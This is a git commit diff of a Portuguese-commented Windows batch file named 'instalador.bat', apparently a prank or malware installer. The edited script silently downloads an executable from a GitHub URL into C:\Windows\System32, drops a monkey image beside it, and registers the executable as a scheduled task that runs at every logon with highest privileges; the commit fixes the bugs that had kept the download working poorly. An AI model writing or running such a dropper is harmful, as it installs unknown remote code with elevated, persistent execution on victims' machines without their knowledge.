b2fb2bf98b284e17f4af9cbde3bf6107c1d40c9c
Guilherme <maxguilham@protonmail.com>
2024-10-24 15:36:38 -0300

    Update instalador.bat

--- instalador.bat
+++ instalador.bat
@@ -1,38 +1,41 @@
 @echo off
 setlocal
 
-
+REM Definir URLs para download
 set "PY_URL=https://github.com/mdsmax/fefipefefotrolagem/raw/src.exe"
 set "IMG_URL=https://png.pngtree.com/thumb_back/fh260/background/20230613/pngtree-young-monkey-looking-at-the-camera-with-its-mouth-open-image_2911673.jpg"
 
-
+REM Definir caminhos locais
 set "DOWNLOAD_DIR=C:\Windows\System32"
 set "EXE_FILE=%DOWNLOAD_DIR%\script_inicializacao.exe"
 set "IMAGE_FILE=%DOWNLOAD_DIR%\macaco.jpg"
 
-
-
-curl -o "%PYTHON_FILE%" "%PY_URL" --silent
+REM Baixar o arquivo EXE
+echo Baixando script EXE...
+curl -o "%EXE_FILE%" "%PY_URL%" --silent
 if %ERRORLEVEL% NEQ 0 (
-    echo falha ao baixar o script.
+    echo Falha ao baixar o script.
     pause
+    exit /b 1
 )
 
-
-
-curl -o "%IMAGE_FILE%" "%IMG_URL" --silent
+REM Baixar a imagem
+echo Baixando imagem...
+curl -o "%IMAGE_FILE%" "%IMG_URL%" --silent
 if %ERRORLEVEL% NEQ 0 (
-    echo falha ao baixar a imagem.
+    echo Falha ao baixar a imagem.
     pause
+    exit /b 1
 )
 
-
-echo configurando script para iniciar com o sistema
+REM Adicionar o EXE à inicialização do Windows usando o agendador de tarefas
+echo Configurando script para iniciar com o sistema...
 schtasks /create /sc onlogon /tn "ScriptInicializacao" /tr "\"%EXE_FILE%\"" /rl highest /f
 if %ERRORLEVEL% NEQ 0 (
-    echo falha ao configurar o script para inicialização.
+    echo Falha ao configurar o script para inicialização.
     pause
+    exit /b 1
 )
 
-echo instalacao concluida com sucesso!
+echo Instalacao concluida com sucesso!
 pause
